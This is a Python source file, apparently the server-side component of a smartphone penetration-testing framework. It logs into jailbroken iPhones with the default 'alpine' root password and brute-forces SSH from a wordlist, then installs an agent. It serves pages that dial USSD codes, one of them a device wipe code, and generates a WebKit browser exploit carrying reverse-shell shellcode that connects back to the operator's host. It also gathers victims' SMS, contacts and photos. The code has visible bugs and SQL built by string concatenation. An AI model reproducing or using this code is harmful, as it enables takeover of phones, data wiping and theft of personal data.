#!/usr/bin/python
version = "0.1.7"
import os
from os import system
import sys
import re
import serial
from time import sleep
import struct
import pexpect
from lib.serial import read_modem
from lib.config import Config
from lib.db import DB, DBException
config = Config('config')

ipaddress = config.get('IPADDRESS')
webserver = config.get('WEBSERVER')
path = sys.argv[1]
key = sys.argv[2]

sqlserver = config.get('MYSQLSERVER')

while True:
    fullpath5 = webserver + path + "/putfunc"
    PUTFILE = open(fullpath5, 'r+')
    line = PUTFILE.readline()
    PUTFILE.close()
    PUTFILE2 = open(fullpath5, 'w')
    print PUTFILE2
    PUTFILE2.close()
    arsplit = line.split(' ')

    if  arsplit[0] == key :
        if  arsplit[1] == "alpine" :
            vulnerable     = "no"
            agent          = "no"
            command        = 'sftp'
            victim         = arsplit[2]
            param          = "root@" + victim
            timeout        = 10
            passwordstring = parm + "'s password: "
            putfile = "com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb"
            connectstring = "Connecting to " + victim + "..."
            installcommand = "dpkg -i  com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb\n"

            try:
                exp = pexpect.spawn(command +' '+ param)
            except Exception, e:
                print 'Cannot spawm sftp command'
                sys.exit()

            # exp->slave->stty(qw(raw -echo))
            exp.expect([connectstring], timeout)
            exp.expect(["Are you sure you want to continue connecting (yes/no)?"], timeout)
            exp.expect(passwordstring, timeout)
            exp.send("alpine\n")

            if  exp.expect(["sftp>"], timeout ) :
                vulnerable = "yes"
            
            exp.send("put putfile\n")
            exp.expect( timeout, ["sftp>"] )
            exp.send("bye\n")
            command2 = "ssh"
            exp = pexpect.spawn(command2 +' '+ param)
            exp.expect( timeout, passwordstring )
            exp.send("alpine\n")
            exp.expect( [r'root\s*'], timeout)
            exp.send(installcommand)
            exp.expect("Setting up com.bulbsecurity.tooltest (0.0.1-23) ...", timeout )
            exp.send("tooltest\n")

            if (exp.expect(["Smartphone Pentest Framework Agent"], timeout)):
                agent = "yes"
            
            exp.send("exit")
            exp.close()
            fullpath2 = webserver + path + "/text2.txt"
            GETFILE = open(fullpath2, 'w')
            GETFILE.write("Apline Agent " + agent)
            GETFILE.close()
            table     = "remote"

            db = DB(config=config)
            alpine      = "alpine"
            db.query("INSERT INTO "+table+" (id,ip,exploit,vuln,agent) VALUES (DEFAULT,%s,%s,%s,%s)", (ipaddress,alpine,vulnerable,agent))
        
        elif  arsplit[1] == "evil" :
            print "Something something\n"
            webserver = config.get('WEBSERVER')
            sqlserver = config.get('MYSQLSERVER')
            ipaddress = config.get('IPADDRESS')
            localpath = arsplit[2]
            filename  = arsplit[3]
            link      = "http://" + ipaddress + localpath + filename
            fullpath  = webserver + localpath
            command1  = "mkdir " + fullpath
            system(command1)
            sploitfile = webserver + localpath + filename
            command8   = "touch " + sploitfile
            system(command8)
            command9 = "chmod 777 " + sploitfile
            system(command9)
            SPLOITFILE = open(sploitfile, 'w')
            SPLOITFILE.write("<html>\n")
            SPLOITFILE.write("<head>\n")
            sploit2     = "/redirect.html"
            sploitfile2 = webserver + localpath + sploit2
            SPLOITFILE.write("<meta http-equiv=\"refresh\" content=\"1;url=http://" + ipaddress + path + sploit2 + "\">\n")
            SPLOITFILE.write("</head>\n")
            SPLOITFILE.write("<frameset>\n")
            SPLOITFILE.write("<frame src=\"tel:*2767*3855%23\" />\n")
            SPLOITFILE.write("</frameset>\n")
            SPLOITFILE.write("</html>\n")
            SPLOITFILE.close()
            command8 = "touch " + sploitfile2
            system(command8)
            command9 = "chmod 777 " + sploitfile2
            system(command9)
            SPLOITFILE2 = open(sploitfile2, 'w')
            SPLOITFILE2.write("<html>\n")
            SPLOITFILE2.write("<frameset>\n")
            SPLOITFILE2.write("<frame src=\"tel:*2767*3855%23\" />\n")
            SPLOITFILE2.write("</frameset>\n")
            SPLOITFILE2.write("</html>\n")
            SPLOITFILE2.close()

        elif  arsplit[1] == "safe" :
            print "Safe\n"
            webserver = config.get('WEBSERVER')
            sqlserver = config.get('MYSQLSERVER')
            ipaddress = config.get('IPADDRESS')
            localpath = arsplit[2]
            filename  = arsplit[3]
            link      = "http://" + ipaddress + localpath + filename
            fullpath  = webserver + localpath
            command1  = "mkdir " + fullpath
            system(command1)
            sploitfile = webserver + localpath + filename
            command8   = "touch " + sploitfile
            system(command8)
            command9 = "chmod 777 " + sploitfile
            system(command9)
            SPLOITFILE = open(sploitfile, 'w')
            SPLOITFILE.write("<html>\n")
            SPLOITFILE.write("<head>\n")
            sploit2     = "/redirect.html"
            sploitfile2 = webserver + localpath + sploit2
            SPLOITFILE.write("<meta http-equiv=\"refresh\" content=\"1;url=http://" + ipaddress + path + sploit2 + "\">\n")
            SPLOITFILE.write("</head>\n")
            SPLOITFILE.write("<frameset>\n")
            SPLOITFILE.write("<frame src=\"tel:*%2306%23\" />\n")
            SPLOITFILE.write("</frameset>\n")
            SPLOITFILE.write("</html>\n")
            SPLOITFILE.close()
            command8 = "touch " + sploitfile2
            system(command8)
            command9 = "chmod 777 " + sploitfile2
            system(command9)
            SPLOITFILE2 = open(sploitfile2, 'w')
            SPLOITFILE2.write("<html>\n")
            SPLOITFILE2.write("<frameset>\n")
            SPLOITFILE2.write("<frame src=\"tel:*%2306%23\" />\n")
            SPLOITFILE2.write("</frameset>\n")
            SPLOITFILE2.write("</html>\n")
            SPLOITFILE2.close()
            print "Done\n"
        
        elif  arsplit[1] == "guess" :
            ipaddress = arsplit[2]
            passfile  = arsplit[3]
            guesscheck( ipaddress, passfile )

        elif  arsplit[1] == "20101759" :
            print "webkit\n"
            mypath   = arsplit[2]
            myfile   = arsplit[3]
            number   = arsplit[4]
            command1 = "mkdir " + webserver + mypath
            system(command1)
            shellipaddress = config.get('SHELLIPADDRESS')
            ipaddresscopy  = shellipaddress
            octets         = ipaddresscopy.split('.')

            hex1 = "%.2x"%int(octets[0])
            hex2 = "%.2x"%int(octets[1])
            hex3 = "%.2x"%int(octets[2])            
            hex4 = "%.2x"%int(octets[3])

            sploitfile     = webserver + mypath + myfile
            command8       = "touch " + sploitfile
            system(command8)
            command9 = "chmod 777 " + sploitfile
            system(command9)
            SPLOITFILE = open(sploitfile, 'w')
            SPLOITFILE.write("<html>\n")
            SPLOITFILE.write("<head>\n")
            SPLOITFILE.write("<script>\n")
            SPLOITFILE.write("var ip = unescape(\"\\u" + hex2 + hex1 + "\\u" + hex4 + hex3 + "\");\n")
            SPLOITFILE.write("var port = unescape(\"\\u3930\");\n")
            SPLOITFILE.write("function trigger()\n")
            SPLOITFILE.write("{\n")
            SPLOITFILE.write("var span = document.createElement(\"div\");\n")
            SPLOITFILE.write("document.getElementById(\"BodyID\").appendChild(span);\n")
            SPLOITFILE.write("span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n")
            SPLOITFILE.write("}\n")
            SPLOITFILE.write("function exploit()\n")
            SPLOITFILE.write("{\n")
            SPLOITFILE.write("var nop = unescape(\"\\u33bc\\u0057\");\n")
            SPLOITFILE.write("do\n")
            SPLOITFILE.write("{\n")
            SPLOITFILE.write("nop+=nop;\n")
            SPLOITFILE.write("} while (nop.length<=0x1000);\n")
            SPLOITFILE.write("var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n")
            SPLOITFILE.write("scode += port;\n")
            SPLOITFILE.write("scode += ip;\n")
            SPLOITFILE.write("scode += unescape(\"\\u2000\\u2000\");\n")
            SPLOITFILE.write("target = new Array();\n")
            SPLOITFILE.write("for(i = 0; i < 0x1000; i+=1)\n")
            SPLOITFILE.write("target[i] = scode;\n")
            SPLOITFILE.write("for (i = 0; i <= 0x1000; i+=1)\n")
            SPLOITFILE.write("{\n")
            SPLOITFILE.write("document.write(target[i]+\"<i>\");\n")
            SPLOITFILE.write("if (i>0x999)\n")
            SPLOITFILE.write("{\n")
            SPLOITFILE.write("trigger();\n")
            SPLOITFILE.write("}\n")
            SPLOITFILE.write("}\n")
            SPLOITFILE.write("}\n")
            SPLOITFILE.write("</script>\n")
            SPLOITFILE.write("</head>\n")
            SPLOITFILE.write("<body id=\"BodyID\">\n")
            SPLOITFILE.write("Enjoy!\n")
            SPLOITFILE.write("<script>\n")
            SPLOITFILE.write("exploit();\n")
            SPLOITFILE.write("</script>\n")
            SPLOITFILE.write("</body>\n")
            SPLOITFILE.write("</html>\n")
            SPLOITFILE.close()
            vulnerable = "no"

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((str(shellipaddress), 12345))

            data_socket = s.accept()
            if   data_socket:
                data = "/system/bin/id\n"
                data_socket.write(data)
                data = data_socket.read()
                close(data_socket)
                vulnerable = "yes"
                fullpath2  = webserver + path + "/text2.txt"
                GETFILE = open(fullpath2, 'w')
                GETFILE.write(vulnerable)
                GETFILE.close()
            
            table     = "client"
            db = DB(config=config)
            webkit      = "webkit"
            
            db.query("INSERT INTO "+table+" (id,number,exploit,vuln) VALUES (DEFAULT,%s,%s,%s)", (number,webkit,vulnerable))

        elif  arsplit[1] == "ANDROID" :
            mypath   = arsplit[2]
            myfile   = arsplit[3]
            command1 = "mkdir " + webserver + mypath
            system(command1)
            androidagent = config.get('ANDROIDAGENT')
            command = "cp " + androidagent + " " + webserver + mypath + myfile
            system(command)
        
        elif  arsplit[1] == "IPHONE" :
            pass
        
        elif  arsplit[1] == "BLACKBERRY" :
            pass
        
        elif  arsplit[1] == "AGENTS" :
            db = DB(config=config)            
            db.query("SELECT COUNT(*) from agents")
            row       = db.fetchone()[0]
            fullpath2 = webserver + path + "/text2.txt"
            CLEARFILE2 = open(fullpath2, 'w')
            CLEARFILE2.close()
            GETFILE = open(fullpath2, 'w')

            if  row == 0 :
                GETFILE.write( key + " NONE\n")
                GETFILE.close()
            
            else :
                GETFILE.write(key + " AGEN\n")
                for i in range(1,row+1):
                    db.query("SELECT number from agents where id=" + i)
                    r           = db.fetchone()[0]
                    db.query("SELECT controlkey from agents where id=" + i)
                    q             = db.fetchone()[0]
                    agentlistitem = i + ".) " + str(r) + " " + q + "\n"
                    GETFILE.write(agentlistitem)
                GETFILE.close()

        elif  arsplit[1] == "ROOT" :
            i        = arsplit[2]
            db = DB(config=config)            
            db.query("SELECT path from agents where id=" + i)
            path1       = db.fetchone()[0]
            sleep(60)
            text = webserver + path1 + "/text.txt"
            TEXTFILE = open(text, 'r+')
            line  = TEXTFILE.readline()
            table = "data"
            yes   = "line"
            db.query("UPDATE "+table+" SET root=" + "'" + yes + "'" + " WHERE id=" + "'" + i + "'")
            TEXTFILE.close()
            TEXTFILE2 = open(text, 'w')
            TEXTFILE2.close()

        elif  arsplit[1] == "PICT" :
            i        = arsplit[2]
            
            db.query("SELECT path from agents where id=" + i)
            path1       = db.fetchone()[0]
            sleep(5)
            picturefile = webserver + path1 + "/picture.jpg"
            PICTURE = open(picturefile, 'r+')

            if  os.path.getsize(picturefile) != 0:
                command = "cp" + " " + picturefile + " " + "."
                system(command)
                picturedir = getcwd()
                table      = "data"
                picture    = picturedir + "/" + "picture.jpg"
                insertquery = "UPDATE "+table+" SET picture=" + "'" + picture + "'" + " WHERE id=" + "'" + i + "'"
                #print insertquery
                PICTURE.close()
                PICTURE2 = open(picturefile, 'w')
                PICTURE2.close()
        
        elif  arsplit[1] == "SMSS" :
            i = arsplit[2]
            sleep(5)
            text = webserver + path + "/text.txt"
            TEXTFILE = open(text, 'r+')
            line     = TEXTFILE.readline()
            table    = "data"
            
            db = DB(config=config)

            db.query("UPDATE "+table+" SET sms=" + "'" + line + "'" + " WHERE id=" + "'" + i + "'")
            TEXTFILE.close()
            TEXTFILE2 = open(text, 'w')
            TEXTFILE2.close()
        
        elif  arsplit[1] == "CONT" :
            i = arsplit[2]
            sleep(5)
            text = webserver + path + "/text.txt"
            TEXTFILE = open(text, 'r+')
            line     = TEXTFILE.readline()
            table    = "data"
            
            db = DB(config=config)

            db.query("UPDATE "+table+" SET contacts=" + "'" + line + "'" + " WHERE id=" + "'" + i + "'")
            TEXTFILE.close()
            TEXTFILE2 = open(text, 'w')
            TEXTFILE2.close()
        
        elif  arsplit[1] == "DATA" :
            id       = arsplit[2]
            
            db = DB(config=config)

            db.query("SELECT sms from data where id=" + id)
            smsrow      = db.fetchone()[0]
            db.query("SELECT contacts from data where id=" + id)
            contactsrow = db.fetchone()[0]
            db.query("SELECT picture from data where id=" + id)
            picturerow  = db.fetchone()[0]
            db.query("SELECT root from data where id=" + id)
            rootrow     = db.fetchone()[0]
            fullpath2   = webserver + path + "/text2.txt"
            CLEARFILE2 = open(fullpath2, 'w')
            print CLEARFILE2
            CLEARFILE2.close()
            GETFILE = open(fullpath2, 'w')
            GETFILE.write("SMS Database: " + smsrow + "\n")
            GETFILE.write("Contacts: " + contactsrow + "\n")
            GETFILE.write("Picture Location: " + picturerow + "\n")
            GETFILE.write("Rooted?: " + rootrow + "\n")
            GETFILE.close()

        print "Endloop\n"
    sleep(1)
print "broke\n"

def guesscheck(ipaddress, passfile):
    vulnerable = "no"
    agent      = "no"
    command    = 'sftp'
    param      = "root@" + ipaddress
    timeout    = 10
    notfound = "ssh: connect to host " + ipaddress + " port 22: Connection refused"
    passwordstring = parm + "'s password: "
    location       = config.get('IPHONEAGENT')
    putfile        = location
    connectstring  = "Connecting to " + ipaddress + "..."
    installcommand = "dpkg -i " + "iphone.deb" + "\n"
    guesspassword  = "null"
    READFILE = open(passfile, 'r+')

    for line in READFILE.readlines():
        guess  = line
        guess2 = guess + "\n"

        try:
            exp = pexpect.spawn(command +' '+ param)
        except Exception, e:
            print 'Cannot spawm sftp command'
            return 1

        exp.expect([connectstring], timeout)
        exp.expect(["Are you sure you want to continue connecting (yes/no)?"], timeout)
        exp.expect(passwordstring, timeout)
        exp.send(guess2)
        if  exp.expect( timeout, ["sftp>"] ) :
            vulnerable    = "yes"
            guesspassword = guess
            exp.send("put putfile\n")
            exp.expect( timeout, ["sftp>"] )
            exp.send("bye\n")
            command2 = "ssh"

            try:
                exp = pexpect.spawn(command2 +' '+ param)
            except Exception, e:
                print 'Cannot spawm sftp command'
                return 1

            exp.expect(passwordstring, timeout)
            exp.send(guess2)
            exp.expect([r'root\s*'], timeout)
            exp.send(installcommand)
            exp.expect("Setting up com.bulbsecurity.tooltest (0.0.1-23) ...", timeout)
            exp.send("tooltest\n")

            if exp.expect(["Smartphone Pentest Framework Agent"], timeout):
                agent = "yes"
            
            exp.send("exit")
            exp.close()
            break
        
    
    table       = "remote"
    guessstring = "Guess: " + guesspassword
    
    db = DB(config=config)
    db.query("INSERT INTO "+table+" (id,ip,exploit,vuln,agent) VALUES (DEFAULT,%s,%s,%s,%s)", (ipaddress,guessstring,vulnerable,agent))
